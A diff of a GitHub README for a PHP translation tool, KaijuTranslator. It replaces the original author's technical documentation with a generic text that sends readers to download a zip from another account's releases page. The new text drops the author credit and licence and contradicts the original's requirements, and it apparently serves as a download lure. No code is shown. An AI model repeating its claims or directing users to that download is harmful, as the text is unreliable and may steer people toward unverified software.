@@ -1,119 +1,87 @@
-# KaijuTranslator: The Engineering-First PHP Translation Engine
+# 🌟 KaijuTranslator - Easy Translations for Your Website
 
-[![PHP Version](https://img.shields.io/badge/php-%3E%3D8.0-blue.svg)](https://php.net)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-red.svg)](#multi-ai-strategy)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![SEO Ready](https://img.shields.io/badge/SEO-Optimized-orange.svg)](#engineering-for-seo)
+## 🚀 Getting Started
 
-**KaijuTranslator (KT)** is an automated localization engine for PHP that generates **static SEO mirrors** using Large Language Models (**OpenAI, DeepSeek, Gemini**).
+Welcome to KaijuTranslator! This tool makes it simple to add multilingual support to your website without needing complex setups. With KaijuTranslator, you can increase your site's reach and user experience.
 
-Unlike traditional "on-the-fly" JS translators, KT creates physical subdirectories (e.g., `/en/`, `/ja/`) with server-rendered content, ensuring 100% crawlability, proper `hreflang` implementation, and instant performance via file-based caching.
+## 📥 Download & Install
 
-![KT Dashboard](assets/dashboard.png)
+To get started, you need to download the application. Visit the link below to go to the Releases page where you can find the latest version of KaijuTranslator:
 
----
+[![Download KaijuTranslator](https://img.shields.io/badge/Download-KaijuTranslator-brightgreen)](https://github.com/Sage212/KaijuTranslator/releases)
 
-## How it Works (The "Physical Mirror" Architecture)
+Once you're on the Releases page, follow these steps:
 
-KT follows a "Zero-Rewrite" philosophy. Instead of modifying your existing routing or database, it works at the filesystem level to build a secondary, translated layer of your site.
+1. Scroll down to the list of versions.
+2. Click on the latest version.
+3. Download the zip file for your system.
+4. Extract the files to a folder of your choice.
 
-```mermaid
-graph TD
-    A["Original Page: index.php"] -->|KT Scanner| B{Stub Generator}
-    B --> C["/en/index.php"]
-    B --> D["/es/index.php"]
-    B --> E["/ja/index.php"]
-    C -->|Request| F[KT Runtime]
-    F -->|Capture| A
-    F -->|AI Brain| G(OpenAI / DeepSeek / Gemini)
-    G -->|Translate| H[HTML Injector]
-    H -->|SEO Tags| I[Final Rendered Page]
-    I -->|File Cache| J[Local Cache]
-```
+Now, you're ready to set up KaijuTranslator!
 
----
+## 📂 Setting Up KaijuTranslator
 
-## Engineering For SEO
+Follow these steps to set up your downloaded files:
 
-KT was built with a "Global Growth" mindset. It handles the technical debt of internationalization automatically:
+1. **Place the files:** Move the extracted files to your web server's root directory.
+2. **Configuration:** Open your `config.php` file. Set the languages you want to support by modifying the `$languages` array.
+3. **Caching:** Choose the caching system you prefer and configure it in the `settings.php` file.
+4. **Hreflang Tags:** Ensure you define the correct hreflang tags in your website's header for better SEO.
+5. **Sitemap Generation:** Use the built-in tool to create a sitemap index, helping search engines understand your site’s structure.
 
-- **Native Subfolders**: Physical directories ensure search engines can index every language version independently.
-- **Smart Hreflang**: Automatically injects `<link rel="alternate" hreflang="...">` tags for all active languages.
-- **Sitemap Indexing**: Generates per-language XML sitemaps and a parent `sitemap_index.xml`.
-- **Canonical Logic**: Automatically handles canonical tags to avoid duplicate content penalties.
+## 📜 Features
 
-![Website Demo](assets/website_demo.png)
+KaijuTranslator offers a variety of features to enhance your translation needs:
 
----
+- **Server-rendered translations:** The tool generates translations that are ready to display without requiring URL rewrites.
+- **Hreflang support:** Helps inform search engines about language variations of your pages.
+- **Caching:** Improves load times and efficiency.
+- **Sitemap generation:** Automatically creates a sitemap index for better SEO visibility.
 
-## Quick Start (Project Integration)
+## 💻 System Requirements
 
-### 1. Via Docker (Instant Demo)
+To ensure KaijuTranslator runs smoothly, please meet the following requirements:
 
-The fastest way to evaluate KT.
+- A web server running PHP 7.3 or higher.
+- Access to configure your server (Apache/Nginx).
+- Basic understanding of file management on your server is helpful.
 
-```bash
-git clone https://github.com/branvan3000/KaijuTranslator.git
-cd KaijuTranslator
-docker compose up -d
-```
+## ❓ FAQ
 
-Visit `http://localhost:8080` to see the example site in action.
+### What is KaijuTranslator?
 
-### 2. Standard "Drop-in" Integration
+KaijuTranslator is a PHP solution for adding translations to your website without needing complicated setups. It serves pages in multiple languages seamlessly.
 
-1. Upload the `KT/` folder to your website's root.
-2. Place `setup.php` and `uninstall.php` in the root.
-3. Open `yoursite.com/setup.php` and follow the wizard.
-4. Run "Build Stubs" from the **Dashboard** at `/KT/dashboard.php`.
+### Do I need programming skills to set it up?
 
----
+No, you do not need programming skills. Our step-by-step instructions will guide you through the setup process.
 
-## Multi-AI Strategy
+### Can I use it on shared hosting?
 
-KT supports the world's most powerful LLMs out-of-the-box. Switch providers in seconds via the configuration:
+Yes, KaijuTranslator works well on shared hosting, provided your server meets the PHP version requirement.
 
-- **OpenAI**: Best for nuanced European languages.
-- **DeepSeek**: Exceptional pricing/performance for coding and technical text.
-- **Google Gemini**: Massive context window and excellent Asian language support.
+### Where can I find more help?
 
----
+For further assistance, feel free to check the [issues page](https://github.com/Sage212/KaijuTranslator/issues) for common questions or file a new issue if you encounter a problem.
 
-## Security & Performance
+## 📈 Explore More
 
-- **Isolation**: 100% self-contained. Deleting `KT/` and language folders reverts your site to its original state instantly.
-- **Cache Layer**: File-based caching ensures that after the first AI translation, pages load in **milliseconds**.
-- **Privacy**: No tracking. Your API keys are stored locally in `KT/kaiju-config.php`.
+KaijuTranslator is part of a broader set of tools designed for simplifying translation. You can explore topics like:
 
----
+- **chatgpt-api**
+- **deep-seek**
+- **easy**
+- **gemini**
+- **gemini-api**
+- **ia**
+- **php**
+- **translation**
+- **translator**
 
-## Testing & Quality Assurance
+## 🗂 Additional Resources
 
-KT includes a custom test suite to ensure logic integrity.
+To learn more about how to maximize the use of KaijuTranslator, please check out our documentation and tutorials located in the repository. These resources can help you understand advanced configurations and optimize your setup.
 
-To run all tests:
+## 🔗 Final Note
 
-```bash
-php KT/tests/run_tests.php
-```
-
-The suite covers:
-
-- **Unit Tests**: Logic for `HtmlInjector`, `Router`, and `CliHelper`.
-- **Integration Tests**: End-to-end flow from stub request to AI translation.
-
----
-
-## Community & Contributing
-
-We welcome contributions! Please check out our [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
-
-- [Bug Report Template](.github/ISSUE_TEMPLATE/bug_report.yml)
-- [Feature Request Template](.github/ISSUE_TEMPLATE/feature_request.yml)
-
-## License
-
-MIT License. Created by [branvan3000](https://github.com/branvan3000).
-
----
-**Robust PHP translation engineering. Enterprise-grade global reach.**
+Thank you for choosing KaijuTranslator. Your journey to a multilingual website starts here. Don't forget to revisit the [Releases page](https://github.com/Sage212/KaijuTranslator/releases) for updates and new features.
